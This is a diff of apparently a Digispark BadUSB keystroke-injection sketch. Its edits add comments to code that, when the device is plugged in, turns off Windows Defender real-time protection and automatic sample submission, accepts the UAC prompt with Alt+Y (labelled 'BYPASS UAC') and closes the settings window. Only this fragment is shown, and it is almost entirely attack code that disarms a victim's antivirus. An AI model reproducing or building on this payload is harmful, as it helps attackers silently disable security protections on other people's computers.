@@ -27,7 +27,7 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_SPACE);
+  DigiKeyboard.sendKeyStroke(KEY_SPACE); // turn off real time protection
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT); // BYPASS UAC
@@ -36,7 +36,7 @@ void loop() {
   DigiKeyboard.delay(300);
   DigiKeyboard.sendKeyStroke(KEY_TAB);
   DigiKeyboard.delay(300);
-  DigiKeyboard.sendKeyStroke(KEY_SPACE);
+  DigiKeyboard.sendKeyStroke(KEY_SPACE); // turn off automatic real time submission
   DigiKeyboard.delay(300);
   DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT); // close the current window
 
